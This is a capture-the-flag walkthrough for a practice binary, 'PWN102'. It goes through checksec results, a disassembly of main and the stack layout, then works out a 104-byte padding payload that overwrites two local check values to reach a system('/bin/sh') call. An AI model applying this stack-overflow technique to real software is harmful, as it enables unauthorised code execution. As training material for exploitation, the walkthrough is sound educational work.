# PWN102 CTF Walkthrough

## Executive Summary

This is a direct stack overflow challenge. The binary uses `scanf()` to read user input and checks if two specific values match hardcoded targets. By overflowing the buffer and precisely positioning our payload, we can overwrite these values and trigger shell command execution via `system()`.

---

## Phase 1: Reconnaissance

### 1.1 File Information

**Target Binary:** `/home/jack/Documents/hacktivities/projects/pwn ctfs/pwn102/pwn102`

**File Type Analysis:**
```
ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked
Interpreter: /lib64/ld-linux-x86-64.so.2
Not stripped (symbols available)
```

### 1.2 Security Protections Analysis

Using `checksec`:

| Protection | Status | Notes |
|-----------|--------|-------|
| **RELRO** | Full RELRO | Full Read-Only Relocation Object |
| **Stack Canary** | ❌ Not Found | **VULNERABLE** - No stack canary protection |
| **NX** | ✅ Enabled | No eXecute bit set |
| **PIE** | ✅ Enabled | Position Independent Executable |
| **Stripped** | ❌ No | Symbols retained |

### 1.3 Key Strings

```
"I need %x to %x"
"Am I right?"
"Yes, I need %x to %x"
"I'm feeling dead, coz you said I need bad food :("
"/bin/sh"
```

**Interesting Values:**
- `0xbadf00d` (initial value 1)
- `0xfee1dead` (initial value 2)
- `0xc0ff33` (target value 1)
- `0xc0d3` (target value 2)

---

## Phase 2: Binary Analysis

### 2.1 Main Function Disassembly

```assembly
00000000000008fe <main>:
 8fe: 55                    push   %rbp
 8ff: 48 89 e5              mov    %rsp,%rbp
 902: 48 83 ec 70           sub    $0x70,%rsp           # 112 bytes allocated
 91a: c7 45 fc 0d f0 ad 0b  movl   $0xbadf00d,-0x4(%rbp)
 921: c7 45 f8 ad de e1 fe  movl   $0xfee1dead,-0x8(%rbp)
 928-93c: [printf initial values]
 941: 48 8d 45 90           lea    -0x70(%rbp),%rax    # Buffer at -0x70
 945: 48 89 c6              mov    %rax,%rsi
 948: 48 8d 3d 17 02 00 00  lea    0x217(%rip),%rdi   # Format string
 954: e8 f7 fd ff ff        call   750 <__isoc99_scanf@plt>
 959: 81 7d fc 33 ff c0 00  cmpl   $0xc0ff33,-0x4(%rbp)  # Check value 1
 960: 75 30                 jne    992 <main+0x94>
 962: 81 7d f8 d3 c0 00 00  cmpl   $0xc0d3,-0x8(%rbp)   # Check value 2
 969: 75 27                 jne    992 <main+0x94>
 98b: e8 90 fd ff ff        call   720 <system@plt>      # SHELL!
```

### 2.2 Stack Layout

```
RBP + 0x0     ← Frame Pointer
RBP - 0x4     ← Value 1 (0xbadf00d → must be 0xc0ff33)
RBP - 0x8     ← Value 2 (0xfee1dead → must be 0xc0d3)
RBP - 0x70    ← Buffer (112 bytes)
```

---

## Phase 3: Exploitation

### 3.1 Offset Calculation

Buffer starts at: `-0x70(%rbp)`
Value 2 at: `-0x8(%rbp)`
Distance: `0x70 - 0x8 = 0x68 = 104` bytes

Value 1 at: `-0x4(%rbp)`
Distance: `0x70 - 0x4 = 0x6c = 108` bytes

### 3.2 Payload Structure

```
[104 bytes padding] + [0xd3 0xc0 0x00 0x00] + [0x33 0xff 0xc0 0x00]
```

Where:
- First 4 bytes: `0xc0d3` in little-endian for Value 2
- Next 4 bytes: `0xc0ff33` in little-endian for Value 1

### 3.3 Expected Output

```
I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
[Shell spawned]
```

---

## Key Differences from PWN101

PWN101 had:
- Single 64-byte buffer
- Single check value
- Simple overflow

PWN102 has:
- Larger 112-byte buffer  
- Two separate check values
- Required precise offset calculation
- Same vulnerability type but more complex